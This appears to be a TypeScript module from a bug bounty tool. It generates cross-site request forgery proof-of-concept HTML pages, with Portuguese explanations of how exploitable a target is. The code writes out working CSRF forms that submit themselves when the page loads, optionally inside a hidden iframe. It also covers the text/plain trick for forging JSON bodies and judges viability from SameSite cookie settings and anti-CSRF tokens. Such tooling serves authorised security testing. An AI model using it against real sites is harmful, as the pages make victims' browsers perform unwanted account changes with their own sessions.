export interface CsrfParam {
  key: string;
  value: string;
}

export type CsrfMethod = 'POST' | 'GET';
export type CsrfEncoding = 'application/x-www-form-urlencoded' | 'multipart/form-data' | 'text/plain (JSON Trick)';
export type SameSiteCookiePolicy = 'None' | 'Lax' | 'Strict';

export interface CsrfPocInput {
  targetUrl: string;
  method: CsrfMethod;
  encoding: CsrfEncoding;
  params: CsrfParam[];
  customJsonBody?: string;
  autoSubmit: boolean;
  useHiddenIframe: boolean;
  sameSitePolicy: SameSiteCookiePolicy;
  antiCsrfTokenPresent: boolean;
}

export interface CsrfPocResult {
  htmlSource: string;
  viabilityStatus: 'HIGHLY_EXPLOITABLE' | 'CONDITIONALLY_EXPLOITABLE' | 'BLOCKED_BY_SAMESITE' | 'DEFENDED';
  viabilityExplanation: string;
  browserMitigations: string[];
}

export function generateCsrfPoc(input: CsrfPocInput): CsrfPocResult {
  const { targetUrl, method, encoding, params, customJsonBody, autoSubmit, useHiddenIframe, sameSitePolicy, antiCsrfTokenPresent } = input;

  const url = targetUrl.trim() || 'https://vulnerable.target.corp/api/user/change-email';
  const isPost = method === 'POST';
  const isJsonTrick = encoding === 'text/plain (JSON Trick)';

  let formInputsHtml = '';
  if (isJsonTrick && customJsonBody) {
    // text/plain trick for raw JSON body: name='{"field":"value", "junk":"' value='"}'
    const jsonStr = customJsonBody.trim();
    formInputsHtml = `    <!-- JSON CSRF text/plain trick -->\n    <input type="hidden" name='${jsonStr.replace(/'/g, '&#39;')}' value='' />`;
  } else {
    formInputsHtml = params
      .filter(p => p.key.trim().length > 0)
      .map(p => `    <input type="hidden" name="${escapeHtml(p.key)}" value="${escapeHtml(p.value)}" />`)
      .join('\n');
  }

  const iframeAttr = useHiddenIframe ? ' target="csrf-target-iframe"' : '';
  const formEncType = isJsonTrick ? 'enctype="text/plain"' : `enctype="${encoding}"`;

  const scriptAutoSubmit = autoSubmit
    ? `  <script>
    // Auto-submission of CSRF PoC upon victim page load
    window.addEventListener('DOMContentLoaded', () => {
      document.getElementById('csrf-poc-form').submit();
    });
  </script>`
    : `  <!-- Manual execution button for triage testing -->
  <p style="font-family: sans-serif; color: #444;">Clique no botão para disparar a requisição de demonstração CSRF:</p>
  <button type="submit" form="csrf-poc-form" style="padding: 10px 20px; font-weight: bold; background: #d9534f; color: white; border: none; border-radius: 6px; cursor: pointer;">
    Disparar Requisição Forjada
  </button>`;

  const iframeTag = useHiddenIframe
    ? `  <!-- Hidden iframe to prevent victim page navigation redirect -->\n  <iframe name="csrf-target-iframe" style="display:none;" title="CSRF Submitter"></iframe>\n`
    : '';

  const htmlSource = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Bug Bounty CSRF PoC - ${escapeHtml(targetUrl)}</title>
</head>
<body>
  <form id="csrf-poc-form" action="${escapeHtml(url)}" method="${method}" ${isPost ? formEncType : ''}${iframeAttr}>
${formInputsHtml}
  </form>
${iframeTag}
${scriptAutoSubmit}
</body>
</html>`;

  // Determine viability based on browser security standards
  let viabilityStatus: 'HIGHLY_EXPLOITABLE' | 'CONDITIONALLY_EXPLOITABLE' | 'BLOCKED_BY_SAMESITE' | 'DEFENDED' = 'HIGHLY_EXPLOITABLE';
  let viabilityExplanation = '';
  const browserMitigations: string[] = [];

  if (antiCsrfTokenPresent) {
    viabilityStatus = 'DEFENDED';
    viabilityExplanation = 'A requisição exige um token Anti-CSRF criptograficamente randômico e validado no servidor. O ataque falhará a menos que o token seja estático, previsível ou exista uma vulnerabilidade de CORS/XSS para extraí-lo.';
  } else if (sameSitePolicy === 'Strict') {
    viabilityStatus = 'BLOCKED_BY_SAMESITE';
    viabilityExplanation = 'O cookie de autenticação possui atributo SameSite=Strict. Os navegadores modernos nunca enviam este cookie em requisições de origem cruzada (cross-site), bloqueando completamente a forja de requisição.';
    browserMitigations.push('SameSite=Strict cookie attribute');
  } else if (sameSitePolicy === 'Lax') {
    if (isPost) {
      viabilityStatus = 'CONDITIONALLY_EXPLOITABLE';
      viabilityExplanation = 'O cookie de autenticação possui SameSite=Lax (padrão em Chrome, Edge, Firefox). Requisições POST cross-site não incluem o cookie, a menos que o cookie tenha menos de 2 minutos de idade ("Lax+POST 2-minute window") ou exista uma rota GET equivalente que execute a ação.';
      browserMitigations.push('SameSite=Lax default behavior for POST requests');
    } else {
      viabilityStatus = 'HIGHLY_EXPLOITABLE';
      viabilityExplanation = 'Requisições GET em cookies com SameSite=Lax continuam enviando os cookies durante navegações de nível superior (Top-level navigation como window.location ou cliques de link). Vulnerabilidade crítica se a alteração de estado for aceita via GET.';
    }
  } else {
    // SameSite=None
    viabilityStatus = 'HIGHLY_EXPLOITABLE';
    viabilityExplanation = 'Com SameSite=None; Secure, o navegador envia cookies de sessão em todas as requisições de origem cruzada. Como não há token Anti-CSRF ativo, a requisição é forjada com sucesso com os privilégios da vítima.';
  }

  return {
    htmlSource,
    viabilityStatus,
    viabilityExplanation,
    browserMitigations
  };
}

function escapeHtml(str: string): string {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}
